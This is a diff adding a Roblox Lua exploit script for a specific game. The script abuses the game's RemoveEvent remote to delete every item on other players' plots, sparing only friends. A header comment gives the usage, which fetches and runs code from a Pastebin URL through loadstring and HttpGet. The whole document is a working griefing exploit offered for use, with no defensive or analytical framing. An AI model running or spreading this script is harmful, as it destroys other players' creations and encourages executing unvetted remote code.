@@ -1,0 +1,41 @@
+-- https://www.roblox.com/games/7799826347/
+--[[
+
+deleteOthers = true
+deleteSelf = false
+friendsBlacklist = true
+
+loadstring(game:HttpGet("https://pastebin.com/raw/QJ51PSyp"))()
+
+--]]
+
+
+local otherPlots = {}
+local selfPlot = nil
+local Event = game:GetService("ReplicatedStorage").Remotes.RemoveEvent
+for _,v in pairs(workspace.Plots:GetChildren()) do
+    if v.Owner.Value ~= game:GetService("Players").LocalPlayer.Name then
+        table.insert(otherPlots,v)
+    else
+        selfPlot = v
+    end
+end
+function deletePlot(plot)
+    task.spawn(function()
+        for _,v in pairs(plot.ItemHolder:GetChildren()) do
+            Event:FireServer(v)
+        end
+    end)
+end
+if deleteSelf == true then
+    deletePlot(selfPlot)
+end
+if deleteOthers == true then
+    for _,v in pairs(otherPlots) do
+        if v.Owner.Value ~= "" and v ~= selfPlot then
+            if not game.Players.LocalPlayer:IsFriendsWith(game.Players:GetUserIdFromNameAsync(v.Owner.Value)) and friendsBlacklist == true then
+                deletePlot(v)
+            end
+        end
+    end
+end
